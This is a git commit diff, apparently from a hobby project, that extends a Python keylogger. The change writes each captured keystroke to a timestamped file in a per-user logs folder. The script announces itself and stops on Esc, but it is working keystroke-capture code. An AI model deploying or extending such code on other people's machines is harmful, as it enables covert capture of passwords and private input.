cb1540405a83baba9fc2c3bbaa93e199250a2871
Jonathan Houle <jo_h1995@hotmail.com>
2023-06-02 13:06:40 -0400

    Now working with writing in file

--- keylogger.py
+++ keylogger.py
@@ -13,24 +13,30 @@ CURRENT_OS_USER = getpass.getuser()
 CURRENT_TIME_OBJECT = datetime.now()
 CURRENT_TIME_STRING = CURRENT_TIME_OBJECT.strftime("%d-%b-%Y-%H:%M:%S")
 
-FILENAME = "keylogger_" + CURRENT_OS_USER + "_" + CURRENT_TIME_STRING
+REPERTORY_FOR_LOGS = "./logs/" + CURRENT_OS_USER + "/"
+FILENAME = "keylogger_" + CURRENT_TIME_STRING
 
 # Starting message
-print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + FILENAME)
+print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + REPERTORY_FOR_LOGS + FILENAME)
 
 # Creating folder for logs if it does not exist and creating the text file
-Path("./logs/" + CURRENT_OS_USER).mkdir(parents=True, exist_ok=True)
+Path(REPERTORY_FOR_LOGS).mkdir(parents=True, exist_ok=True)
+file = open(REPERTORY_FOR_LOGS + FILENAME ,"w")
 
 # Print keys input in terminal (Later, in a text file)
 def on_pressing_key(key):
     try:
         print("{0}".format(key))
+        if(key != keyboard.Key.esc):
+            file.write("{0}".format(key))
+
     except AttributeError:
         print("{0}".format(key))
 
 # To stop the listener
 def on_key_release(key):
     if key == keyboard.Key.esc:
+        file.close()
         print("Keylogger stopped.")
         return False
 
